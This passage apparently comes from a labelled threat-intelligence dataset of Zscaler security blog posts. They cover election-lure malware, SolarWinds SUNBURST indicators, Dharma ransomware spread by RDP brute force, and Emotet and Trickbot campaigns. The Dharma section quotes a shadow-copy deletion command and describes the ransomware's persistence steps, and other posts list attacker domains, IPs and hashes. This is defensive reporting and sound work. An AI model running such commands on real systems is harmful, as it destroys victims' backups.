receiving from political entities creates a perfect storm of potential clickbait.\nLet's take a look at what the ThreatLabZ team has seen during the run-up to the election.\n### **Malware**\nThe ThreatLabZ team at Zscaler came across spam emails with embedded links where threat actors were using election lures to trick users into opening malicious PDF documents, resulting in malware execution.\nWe have also seen a malicious PDF document show up in Google search results for \u201cCA voter registration form\u201d.\nWe can see this in the screenshot\u00a0below.\n![Google search result](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-28%2011_28_32-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 1: This\u00a0Google search result CA voter registration form returned a link to a malicious PDF.*\nWhen a user clicks on the Google search result or opens the link in the email (*cdn[.]shopify[.]com/s/files/1/0434/3165/7621/files/31416322246.pdf)*, the PDF will open and a Captcha image is presented, trying to trick the user into clicking it.\n![PDF page 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-21%2016_40_23-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 2: The first page of malicious PDF claiming to be a California voter registration form.*\nThe second page of the PDF contains text claiming to provide users with information about the voter registration form.\n![PDF page 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-21%2016_47_11-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 3: The second page of a malicious PDF claiming to provide information about California voter registration.*\nUpon clicking, the PDF downloads a malware payload.\nThe executable payload includes many junk statements in an attempt to evade analysis.\n![Junk code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image24.png)\n*Figure 4: This malware is stuffed with junk statements in an attempt to evade detection.*\nThe malware utilizes GlobalAlloc to allocate memory and then stores obfuscated shellcode at the location.\n![obfuscated code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image4.png)\n*Figure 5: The obfuscated shellcode of this malware.*\nA change of permission happens using VirtualProtect and the shellcode is decoded using the loop below.\n![decoding loop](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image15.png)\n*Figure 6: The shellcode decode routine.*\nThe call to the decoded shellcode is seen below.\n![call to shellcode](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image13.png)\n*Figure 7: The call to the deobfuscated shellcode.*\nThe final deobfuscated PE payload is seen below.\n![Final exe](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image21.png)\n*Figure 8: The deobfuscated malicious executable payload.*\nThe [Zscaler Cloud Sandbox](/products/sandboxing) detected\u00a0this malicious executable and blocked\u00a0it from reaching the end user.\nBelow is the\u00a0report for this executable payload when it was directly submitted to the Zscaler Cloud Sandbox.\n![sandbox_report](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image19.png)\n*Figure 9: The Zscaler Cloud Sandbox report for the malware payload.*\n### **Malicious redirectors**\nWe also observed domains associated with fake digital election campaign platforms, which were serving malicious redirects.\nThe URL seen was \u201c*digitalelectioncampaign[.]com/secure/accounts/secur/list/jtgcwqhnepg2sh7r/\u201d.*\nWhen we reviewed the homepage of the website, we discovered\u00a0that the site makes use of stock photos in the public speaker section trying to mislead visitors.\nThe domain involved is known to have a bad reputation for being associated with malicious activity.\n![Election Campaign page](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-14%2015_30_23-.png)\n*Figure 10: A fake digital election campaign homepage.*\n![speaker page](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-14%2015_30_57-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 11: Stock photos are used on the homepage to mislead visitors into believing that they are legitimate candidates.*\nWe also found malicious JavaScript redirects being loaded by the domain.\n![Malicious JavaScript Redirects](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-21%2012_30_33-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 12: The malicious JavaScript redirect served by the domain.*\nThe redirected domain is malicious in nature and is found to serve trojan, adware, and malicious APK files.\n**Keywords in domain names**\n----------------------------\nWe also observed attempts to register typo-squatting domains of political campaigns.\nUsers should be aware that just because a site may bear the name of a candidate, it doesn\u2019t necessarily mean it is legitimate.\nBeing mindful of the candidate\u2019s actual main page will give voters the better idea of their platform and message.\nWe have also noticed that attackers selling illegal credit card data and bank credentials are utilizing election trend keywords for their nefarious purposes.\nFor instance, we have seen the domain\u00a0*trump-dumps[.]cn*\u00a0claiming to sell stolen credit card numbers and login credentials for banks.\n![whois info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image20.png)\n*Figure 13: Whois information of \u201ctrump-dumps.cn\u201d*\n![CC selling website](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image25.png)\n*Figure 14: The login page of trump-dumps[.]cn.*\n![stolen info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image7.png)\n*Figure 15: The homepage of trump-dumps[.]cn with links to various types of stolen data dumps.*\nThere are also domains registered by scammers to mislead benign users\u00a0to serve scam pages for monetary gain.\nIn one instance, we found \u201c*voterlist[.]info*\u201d domain redirecting the users to fake Microsoft tech support pages.\n![Voterlist whois](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image12.png)\n*Figure 16: Whois information for voterlist[.]info.*\nThe domain redirecting users to\u00a0fake Microsoft tech support scams websites.\nIt uses JavaScript to capture mouse controls and trick users into believing their machines are infected.\n![packet capture](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image5.png)\n*Figure 17: The redirection chain of voter-list[.]info, leading to tech support scam page.*\n![Tech support scam](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image10.png)\n*Figure 18: The voterlist[.]info serving fake tech support scam page.*\n**Newly registered domains**\n----------------------------\nThreat actors and scammers have always taken advantage of recent trends by registering domains based on the latest keyword trends.\nAs the 2020 presidential election is one of the top trending events, The ThreatLabZ team has been actively monitoring newly registered domains (NRDs) based on election trends and keywords for the past three months.\n![NRD domains registered](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image22.png)\n*Figure 19: The NRD count seen during the past 10 weeks based on election-related keywords.*\nHere is the list of a few of the election keywords and/or their variations that we monitored against NRDs.\n![keywords](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image9.png)\n*Figure 20: The list of monitored election keywords (found in NRDs).*\nWe also looked at the type of content served by these NRDs.\n![content distribution](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image23.png)\n*Figure 21: The type of content served by election-related NRDs*\nLet's take a closer look at each of these:\n* Valid: We noticed that a good section of the NRDs serving valid content are related to selling merchandise for specific election campaigns.\n* Parked: We noticed that a significant percentage of the NRDs are currently parked (that means being held\u00a0for later use).\n* Invalid: Domains that do not resolve to any IP address.\n* Open directories\nAs we analyzed some of these live websites, there were several instances of suspicious or malicious content being hosted on these election-related NRDs.\nWe will take a look at some of the recent examples.\n**Fake Surveys**\nWe observed instances of fake polling surveys targeted around presidential candidates.\nThese are usually amateur polls or polls designed to redirect users to unofficial merchandise websites once the user chooses an option.\nBelow we can see one such amateur polling site, which was hosted on a vulnerable server containing open directory and outdated software.\n![Fake Poll Survey](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/2020-10-13%2012_25_33-Ubuntu%20-%20VMware%20Workstation.png)\n*Figure 22: A fake polling website.*\nWhile the site appears to be legitimate, the hosting infrastructure has been repeatedly flagged for hosting phishing pages (most recently, a Costco phishing campaign).\nAnother trick that scammers use to lure users to their fake merchandise websites is by publishing ads on Google search results and claiming to be the official websites.\n![Suspicious Shopping Websites](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/google_search_result.png)\n*Figure 23: A Google search result for candidate's merchandise website.*\n![Biden Merchandise unofficial website](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/homepage.png)\n*Figure 24: An inactive suspicious merchandise website.*\n![Biden Merchandise Products page](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/productspage.png)\n*Figure 25: An inactive merchandise website.*\nOn reviewing the site, we see that it is suspicious in nature.\nWe see the logo design has mistakes and the most recent visit to the website showed that the website is down and inactive.\nWe also observed some disinformation campaigns targeting presidential candidates.\n![disinformation](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Election_Blog_2020/image2.png)\n*Figure 26: Websites promoting unverified information and parody websites.*\nEveryone should be careful to validate all sites they visit and only use information from official sources.\n**Conclusion**\n--------------\nThe Zscaler ThreatLabZ team is actively monitoring these campaigns to ensure\u00a0coverage for Zscaler customers.\nWe recommend that users take extra care in the sites they visit and, in particular, use caution when clicking links or opening email messages from untrusted sources.\nHere are a few official voting sites you can visit, as well as tips for safe internet searching.\n* Visit <https://www.usa.gov/how-to-vote> for information on how you can vote.\n+ Visit <https://www.usa.gov/election-office> for more information about your state\u2019s election office if you have questions.\n* Verify the authenticity of a URL or website before accessing it.\nBe wary of links with typos.\n* Check for HTTPS/secure connections when visiting official websites.\nAll legitimate candidates and donation portals use HTTPS connections for their transactions.\n* Don't click links or open documents from unknown parties.\n* Avoid visiting URL-shortened links.\n* Ensure that your operating system and web browser are up to date and have the latest security patches installed.\n* Avoid using public or unsecured Wi-Fi connections if any voting registration information is to be exchanged online.\n* Don\u2019t trust e-mails asking for voter registration details.\nThe election office will always mail ballot information to your address.\nIt will contain instructions to receive information electronically if available.\n* Never provide personally identifying information to any SMS, e-mail, or website asking for voter information.\n* If you have questions about specific issues that will be on your county ballot, you can visit <https://www.vote411.org/> and get a Voter Guide.\n* Monitor US-Cert for information about ongoing attempts to fraud voters: <https://us-cert.cisa.gov/ncas/current-activity/2020/09/10/cisa-insights-email-based-attacks-elections-related-entities>\n* [Report](https://www.ftccomplaintassistant.gov/#crnt&panel1-4) incidents to the FTC.", "mitre_ids": ["T1566", "T1566", "T1566", "T1589", "T1566", "T1583"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CI", "CI", "CI"]}, {"cti_report": "The Hitchhiker\u2019s Guide to SolarWinds Incident Response\nDecember 22, 2020\nOn December 13, 2020, [multiple](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) [security](https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/) vendors in conjunction with [CISA](https://us-cert.cisa.gov/ncas/alerts/aa20-352a) disclosed a software supply-chain attack involving the SolarWinds Orion platform.\nThe disclosure detailed the activities of an advanced persistent threat (APT) adversary that was able to gain access to SolarWinds systems to create trojanized updates to the Orion platform between March 2020 and possibly as recently as December 2020.\nThe trojanized updates included a custom, digitally signed backdoor called SUNBURST.\nSolarWinds Orion is a widely used network infrastructure monitoring and management platform with a reported customer base of over 18,000.\nThe following versions may be affected:\n* Orion Platform 2019.4 HF5, version 2019.4.5200.9083\n* Orion Platform 2020.2 RC1, version 2020.2.100.12219\n* Orion Platform 2020.2 RC2, version 2020.2.5200.12394\n* Orion Platform 2020.2, 2020.2 HF1, version 2020.2.5300.12432\nAt this time, the full scope of the attack remains under investigation.\nWhat is known is that the attack was executed by a truly sophisticated adversary with a deep understanding of operational security and complex tradecraft.\nBased on publicly available data, this adversary demonstrated significant efforts to evade, obfuscate, and clean-up using techniques such as steganography, fingerprinting techniques to identify both target systems as well as analysis systems, rotating infrastructure with a focus on geolocation proximity, as well as executing code in memory as much as possible.\nThese techniques, in combination with using a digitally signed component of a trusted software platform as the initial infection vector, are indicative of a highly skilled and covert adversary willing to expend resources to assure the success of their operation.\nZscaler suggests that all organizations should take several immediate actions, described below, in addition to reviewing the existing security policies and best practices available to Zscaler customers.\nThese actions are recommended for any organization that may be impacted by the SolarWinds event.\nThey are not intended to be a comprehensive guide to all actions that an organization may take, and each organization should perform its own due diligence to assess impact and risk.\n### **Investigation**\nOrganizations should immediately identify all systems that may have SolarWinds Orion installed.\nOnce the systems are identified, the version should be checked against the list of impacted versions.\nDepending on the result of the version(s)\u00a0 installed, additional responses may be required.\nEven if a version is not found on the impacted version list, it may be prudent to perform cursory checks to confirm there is no impact to the organization.\nIf an affected version of Orion is found, that system should be immediately taken offline and all network traffic blocked inbound and outbound.\nAny system or user accounts associated with the affected system should be disabled and reviewed for legitimacy as well as access.\nIf possible, a forensics image of the affected system should also be collected.\n**Network activity**\nBased on public reporting, a SolarWinds Orion system affected by this event\u2014meaning that the SUNBURST backdoor had been successfully installed\u2014would begin network communication to its first stage command and control (C&C) server at avsvmcloud[.]com.\nWhile this activity does indicate that the affected system was within the target radius of the attack, it does not confirm additional compromise or post-exploitation actions.\nZscaler Internet Access (ZIA) customers may be able to perform this search within the DNS Insights or Web Insights area in the portal, or within the log aggregator/SIEM of choice where ZIA logs are sent.\nThis data will however be limited to systems that have their network traffic routed to ZIA.\nThe following network indicators may be used to perform a sweep for a timeframe extending back to March 2020 or further to discover possible compromised systems (note: additional indicators may be discovered as additional data is disclosed).\n**Domains**\n```\n**avsvmcloud[.]com**\ndigitalcollege[.]org\nfreescanonline[.]com\ndeftsecurity[.]com\nthedoccloud[.]com\nwebsitetheme[.]com\nhighdatabase[.]com\nincomeupdate[.]com\ndatabasegalore[.]com\npanhardware[.]com\nzupertech[.]com\nseobundlekit[.]com\nlcomputers[.]com\nvirtualdataserver[.]com\nwebcodez[.]com\ninfinitysoftwares[.]com\nervsystem[.]com\nbigtopweb[.]com - *Added 1/20/21 in relation to RainDrop*\n```\n**IPs**\n```\n13.59.205.66\n54.193.127.66\n54.215.192.52\n34.203.203.23\n139.99.115.204\n5.252.177.25\n5.252.177.21\n204.188.205.176\n51.89.125.18\n167.114.213.199\n```\nAll other internet-bound destinations from the Orion system should also be examined.\nAdditionally, all network activity originating from SolarWinds Orion systems to other internal systems should be reviewed for potential lateral movement.\nThis may prove challenging as most Orion deployments likely allow it to have privileged access across the network to a variety of systems.\nHowever, it may be possible to carve out a smaller set of data to initially analyze by suppressing known-good or expected behaviors from the potentially affected Orion system.\n**Endpoint**\nThe SUNBURST backdoor is a digitally signed DLL file with a specific filename and hash.\nThe existence of this file on an Orion server is indicative that the adversary was able to gain unauthorized access to the system.\nAdditional post-exploitation behaviors may have been performed by the adversary, indicating a successful intrusion.\nThe following indicators and behaviors may assist in confirming a compromise.\n**MD5 hashes**\n```\nb91ce2fa41029f6955bff20079468448\nd5aad0d248c237360cf39c054b654d69\n2c4a910a1299cdae2a4e55988a2f102e\n846e27a652a5e1bfbd0ddd38a16dc865\n```\n**Filename**\n```\nSolarWinds.Orion.Core.BusinessLayer.dll\n```\n**Behaviors**\n* Modification of system tasks\n* delete-create-execute-delete-create directory action pattern\n* Newly created or unknown local user accounts\n* Existence or evidence of usage of Adfind.exe\n* Signs of cmd.exe or rundll32.exe spawned from solarwinds.businesslayerhost.exe\n* Existence of unknown and/or very broad email forwarding/deleting rules on the email gateway\n**User account activity**\nOnce SUNBURST has been deployed, the adversary will most likely begin to perform reconnaissance actions using the privileges of the Orion system and explore what is available in terms of additional assets to compromise or actions to take.\nThe following behaviors may have been observed on the affected Orion system or other systems that have had communication with the affected system.\n* Anomalous logins or repeated failed authentication to internal systems\n* Logins from unknown or unrecognized external sources to internal systems\n* Extremely long duration tokens, which may indicate malicious activity (examine SAML tokens for duration)\n### **Zscaler is here to help**\nAs described in our **[ThreatLabZ blog post](/blogs/security-research/zscaler-coverage-solarwinds-cyberattacks-and-fireeye-red-team-tools-theft)**, Zscaler immediately deployed protections to all customers and continues to deploy additional protections and countermeasures as more information becomes available.\nIn addition, as we had disclosed in our **[Trust Advisory](https://trust.zscaler.com/posts/6896?_gl=1*7rl9s3*_ga*OTQ0OTgyNTM2LjE2MDAxMTMwNTc.*_ga_10SPJ4YJL9*MTYwODY3OTc4OS40Ny4xLjE2MDg2ODAxNjEuNTI.&_ga=2.98380127.1768883422.1608589514-944982536.1600113057)**, Zscaler was not impacted by this event.\nThis may, however, be an opportunity for organizations to reassess their security policies and confirm alignment with documented best practices and recommended policies as described within our documentation, which covers recommendations, such as:\n* Enable SSL inspection where possible | [SSL Best Practice Guide](https://help.zscaler.com/zia/best-practices-testing-and-rolling-out-ssl-inspection)\n* Enable Advanced Threat Protection (ATP) and its associated features | [Recommended Policy](https://help.zscaler.com/zia/recommended-advanced-threat-protection-policy)\n* Enable Advanced Cloud Sandbox with AI-Driven Quarantine | [Recommended Policy](https://help.zscaler.com/zia/recommended-sandbox-policy)\n* Enable Advanced Cloud Firewall with Cloud IPS | [Recommended Policy](https://help.zscaler.com/zia/recommended-ips-control-policy)\n* Enable Cloud Browser Isolation where possible | [About Cloud Browser Isolation](https://help.zscaler.com/zia/about-cloud-browser-isolation)\n* Restrict access to specific URL categories with legitimate business use cases | [Recommended Policy](https://help.zscaler.com/zia/recommended-url-cloud-app-control-policy)\n* Restrict access to specific file-types with legitimate business use cases | [Recommended Policy](https://help.zscaler.com/zia/recommended-file-type-control-policy)\n* Configure DNS Control | [About DNS Control](https://help.zscaler.com/zia/about-dns-control)\n### **Request your complimentary SolarWinds security assessment**\nZscaler has your back.\nEngage with our security experts to gain insight into the SolarWinds attacks and get hands-on best practices guidance to better protect your users, applications, and systems: **[zscaler.com/solarwinds-cyberattack](/solarwinds-cyberattack)**", "mitre_ids": ["T1195", "T1195", "T1195", "T1195", "TA0005", "T1027", "T1027", "T1082", "T1614", "T1055", "T1218", "TA0011", "TA0011", "TA0003", "TA0008", "T1553", "T1543", "T1222", "T1136", "TA0007", "TA0006"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "Ransomware Delivered Using RDP Brute-Force Attack\nJanuary 08, 2021\nZscaler ThreatLabZ recently published a [report](/blogs/security-research/2020-state-cloud-insecurity) on the 2020 State of Public Cloud Security that showed security misconfiguration to be the leading cause of cyberattacks against public cloud infrastructure.\nIn this blog, we will look at one of the commonly abused security misconfigurations\u2014the RDP service port left open to the internet\u2014and how cybercriminals abuse it.\nBrute-forcing RDP (Remote Desktop Protocol) is the most common method used by threat actors attempting to gain access to Windows systems and execute malware.\nThe reason is simple: In our public cloud threat research, we have observed that 70 percent of systems keep RDP ports open in the public cloud.\nThreat actors scan for these publicly open RDP ports to conduct distributed brute-force attacks.\nSystems that use weak credentials are easy targets, and, once compromised, attackers\u00a0sell access to the hacked systems on the dark web to other cybercriminals.\nRansomware groups such as SamSam and Dharma have been spreading almost exclusively via RDP for years.\nIn this case study, we will look at Dharma ransomware attacks.\nDharma, also known as Crysis, has been distributed under a ransomware-as-a-service (RaaS) model since 2016.\nIts source code was up for sale in March 2020, making it available to a wider spectrum.\n### **Infection chain**\nAttackers use open-source port-scanning tools to scan for exposed RDP ports online and then try to gain access to a system using brute-force tools or stolen credentials purchased from the dark web.\nAfter attackers gain access to the target system, they go on to make the system vulnerable by deleting backups, disabling antivirus software, and changing configuration settings.\nOnce the security is disabled and the network vulnerable, attackers deliver malware payloads.\nThe process involves installing ransomware, using infected machines to distribute spam, deploying keyloggers, or installing backdoors to be used for future attacks.\nThe below figure shows the infection cycle of Dharma ransomware delivered via RDP brute-force attack.\n![Infection chain of RDP brute force attack delivers Dharma ransomware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/iv1.JPG)\n*Figure 1:\u00a0Infection chain of RDP brute-force attack delivers Dharma ransomware*\nOnce the attacker gains access to the machine, the following files are uploaded:\n*%temp%\\ns.exe \u2013\u00a0Network enumeration/scanning tool*\n*%programfiles%\\process hacker\\ \u2013\u00a0Process hacker tool*\n[ns.exe](https://www.softperfect.com/products/networkscanner/) is a network enumeration and scanning tool used by attackers to scan SMB shares, open ports, and services through which they can move within the network.\n[Process Hacker](https://github.com/processhacker/processhacker) is a program used mostly by system administrators for monitoring, debugging, and troubleshooting, but in this case, it was used for malicious purposes such as disabling AV or services.\nFollowing the pre-execution process, the attacker uploads a ransomware file and executes it.\n### **Technical details**\nOnce executed, this variant of Dharma ransomware uses the below commands to quietly delete all of the shadow volume copies on the machine.\n*mode con cp select=1251*\n*vssadmin delete shadows /all /quiet*\n*Exit*\nFor persistence, the ransomware executes the following commands:\n1.Copy the file to *%windir%system32* or *%appdata%* and set *'LOCAL\\_MACHINE/LOCAL\\_USER Software\\Microsoft\\Windows\\CurrentVersion\\Run'*\n2.Copy file to 'Startup' folder\n3.Copy file to 'Common Startup\u2019 folder\nThe ransomware encrypts files with the following extensions:\n![File extensions to encrypt](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/extensions.JPG)\n*Figure 2:\u00a0File extensions to encrypt*\nThe ransomware encrypts files using an AES 256 algorithm.\nThe AES key is also encrypted with an RSA 1024 algorithm.\nThis encrypted AES key is stored at the end of the encrypted file along with the filename.\nThe name of the encrypted files have the following pattern:\n*[Filename].id-{8 bytes ID}.[recovery\\_email].zimba*\n![Encrypted files](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/enc_files.PNG)\n*Figure 3:\u00a0Encrypted files*\nAfter encrypting the files, the ransomware pops up two different ransom notes on the victim\u2019s computer.\nOne is the *Info.hta* file, which is launched via autorun when a user logs into the computer.\n![info.hta](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/ransom_note_hta.PNG)\n*Figure 4:\u00a0info.hta*\nThe other note is called FILES ENCRYPTED.txt and can be found on the desktop.\n![FILES ENCRYPTED.txt](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/ransom_note_txt.PNG)\n*Figure 5:\u00a0FILES ENCRYPTED.txt*\n### **Lateral movement**\nDharma ransomware uses typical methods for obtaining credentials and propagating laterally within a network.\nIn most cases, it uses the Mimikatz tool, which allows it to dump the network share credentials, and in other cases, it uses NirSoft CredentialsFileView, which allows for the recovery of passwords stored in encrypted credential files.\nThe obtained credentials are used to attempt lateral movement inside the on-prem as well as public cloud infrastructure.\nIn some cases, the ransomware tries to spread through the network by taking advantage of the compromised Domain Controller and deploying a Default Domain Policy that will run the ransomware payload on StartUp for each machine.\n### **Conclusion**\nSince Dharma ransomware is usually installed by gaining access to Remote Desktop Services, it is important to ensure that those services are properly locked.\nThis includes ensuring that computers running Remote Desktop Services do not connect directly to the internet.\nInstead, organizations should use a zero trust architecture to allow remote users to securely access these servers without exposing them to the entire internet.\nWhile applying security patches is always important, most RDP-based attacks rely on cracking weak credentials, so passwords should be long, unique, and random.\nIt\u2019s important for enterprises to establish password requirements and train employees to use strong passwords.\nAttackers typically identify potential targets by scanning the internet for systems listening on the default RDP port (TCP 3389).\nChanging the listening port via Windows Registry can help organizations hide vulnerable connections.\n[**MITRE ATT&CK**](https://attack.mitre.org/)**tactic and technique mapping**\n| Tactic | Technique |\n| --- | --- |\n| T1190 | Exploit Public-Facing Application |\n| T1059 | Command Line Interface |\n| T1061 | Graphical User Interface |\n| T1547 | Boot or Logon Autostart Execution |\n| T1037 | Startup Items |\n| T1110 | Brute Force |\n| T1003 | Credential Dumping |\n| T1083 | File and Directory Discovery |\n| T1135 | Network Share Discovery |\n| T1018 | Remote System Discovery |\n| T1063 | Security Software Discovery |\n| T1076 | Remote Desktop Protocol |\n| T1105 | Remote File Copy |\n| T1486 | Data Encrypted for Impact |", "mitre_ids": ["T1190", "T1021", "T1110", "T1021", "T1486", "T1486", "T1486", "T1595", "T1110", "T1490", "T1562", "T1562", "T1562", "T1105", "T1486", "T1566", "T1056", "TA0003", "T1486", "T1110", "T1110", "T1486", "T1110", "T1486", "T1105", "T1046", "T1562", "T1486", "TA0002", "T1486", "T1490", "TA0003", "T1486", "TA0002", "T1547", "T1547", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1491", "T1547", "TA0008", "T1486", "TA0006", "TA0008", "S0002", "S0002", "S0002", "T1486", "T1486", "T1484", "T1547", "T1486", "T1021", "T1021", "T1563", "T1110"], "anno_name_label": [["GROUP", "Dharma"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["TOOL", "Process Hacker"], ["GROUP", "Dharma"], ["GROUP", "Dharma"], ["MALWARE", "Mimikatz"], ["GROUP", "Dharma"]], "cti_entity_class": ["CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CI"]}, {"cti_report": "Did COVID Cancel Christmas for Cybercriminals?\nJanuary 29, 2021\nThreatLabZ, the security research team at Zscaler, is responsible for monitoring and tracking global cybercrime activity, which typically drops each year around the Russian Orthodox Christmas on January 7th.\nIn most years, activity increases back to normal near the middle to end of January.\nHowever, in 2021, cybercrime activity did not exhibit this cyclical pattern, which may be explained by COVID-19 travel restrictions that prevented many threat actors from taking an extended leave.\nFigure 1 shows that\u00a0cybercrime activity last year began to rise starting around January 15, 2020, following a lull.\nIn contrast, this year\u2019s criminal activity remained at normal levels before, during, and after the Russian Orthodox Christmas.\n#####\n***![malware 2019-20](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/----category-images/botnets/2019-20-chart.jpg)***\n##### ***\u200bFigure 1**: Malware trends before and after the holiday season in 2019-2020*\n![Malware 2020-21](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/----category-images/botnets/2020-21-chart.jpg)\u200b\n##### ***Figure 2**: Malware trends before and after the holiday season in 2020-2021*\nThe following sections describe recent activities for five of the top malware families, including Emotet, Trickbot, Dridex, ZLoader, and Qakbot.\n### **Emotet**\n**[Update]** \u2013 On January 27, 2021, Europol announced a [global action in disrupting](https://www.europol.europa.eu/newsroom/news/world%25E2%2580%2599s-most-dangerous-malware-emotet-disrupted-through-global-action) Emotet botnet operations.\nThis was a collaborative effort between law enforcement authorities in the Netherlands, Germany, U.S., UK, France, Canada, Lithuania, and Ukraine, with international activity coordinated by Europol and Eurojust.\nZscaler ThreatLabZ has been closely tracking Emotet for several years (see blogs from [October 2019](/blogs/security-research/emotet-back-action-after-short-break), [February 2019](/blogs/security-research/demystifying-crypter-used-emotet-qbot-and-dridex), and [August 2017](/blogs/security-research/look-recent-emotet-campaigns-august-2017)).\nWe can confirm that we haven't seen any updates or activity from the Emotet C&C infrastructure in the past 48 hours, which indicates that the takedown operation has been successful.\nHowever, we have seen similar gangs push out new variants and resurrect the botnet using a new C&C infrastructure.\nWe are closely monitoring for any new Emotet variants and activity.\nEmotet resumed its activity as of Monday, January 4, 2021.\nTo take advantage of the holiday season, Emotet briefly ramped up its activity between December 21 and 30, 2020.\nDuring this ramped-up activity, Emotet was mostly using a *reply chain* (also known as *email thread hijacking)* spam email as the bait.\nA reply chain attack is when threat actors hijack real email threads and utilize legitimate email messages stolen from victims\u2019 email applications.\nThe threat actors then spoof a legitimate email and impersonate a reply to the stolen email.\nThis email reply is again targeted to addresses from the original email, allowing it to further gain trust from targets.\nWhile the first batch of emails was targeting English-speaking countries, spam emails in German, Italian, French,\u00a0 Spanish, and Polish followed shortly thereafter.\nAn example of an Emotet reply chain spam email in Italian is shown in Figure 3.\n![fig.3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/----category-images/botnets/figure3_reply_chain.jpg)\n##### ***Figure 3****: Emotet reply chain example*\nThe main Emotet loader had some minor changes after returning from a brief break.\nThe build version number was set to 0x13461BF (20210111), while the loader version number still remained at 0x1388 (5000).\nEmotet continued to use spam with malicious Microsoft Word documents attached as the primary distribution method.\nOn January 20,2021, Emotet increased the build number to 0x13461C8 (20210120) and the loader version number to 0x1770 (6000).\nAnother interesting tactical move by Emotet that started in January was the shift to password-protected ZIP attachments.\nInstead of including the password in the email body text, Emotet started using embedded images that contain the ZIP password.\nThis tactic is likely to defeat automation deployed by security products and researchers.\nThe group has also continued to use a DLL file for the loader instead of a standard Windows executable, which may be to further evade detection.\nEmotet was last seen deploying the following modules:\n* Proxy (uPnP) module\n* Browser password stealer (based on WebPassView)\n* Email password stealer (MailPassView)\n* Email content stealer\n* Email contact stealer\nIn addition, Emotet has been observed delivering Trickbot as a second-stage payload.\n**Indicators -\u00a0[Emotet IOCs](https://pastebin.com/bFAW538P)**\n### **Trickbot**\nEmotet started dropping Trickbot as a secondary payload on victim machines after it returned from the holiday break.\nTrickbot is operated by the same threat actor that deploys Conti and Ryuk ransomware.\nTherefore, these ransomware operations likely resumed around the same time as well.\nEmotet was distributing Trickbot with the group tags *mor12* and *mor13*.\nThere have not been any significant changes in Trickbot following the holiday break.\nTrickbot was also distributed by another spam campaign on the same day by the group tag *rob35*.\nThis specific campaign was being distributed via SpamEx, which distributed a malicious JavaScript file embedded in a ZIP file.\nWhen opened, the JavaScript was used to invoke PowerShell to download and execute Trickbot from phishing sites.\nThe Trickbot campaigns with the group tags *tot6* and *lib6* have also been observed since the holiday break.\n**Indicators -\u00a0[Trickbot IOCs](https://pastebin.com/mAzUnpUQ)**\n### **Dridex**\nOn January 11, 2021, ThreatLabZ observed the emergence of Dridex with a Cutwail spam campaign.\nThe group used an invoice theme to distribute the Dridex loader.\nThe Cutwail spam distributed 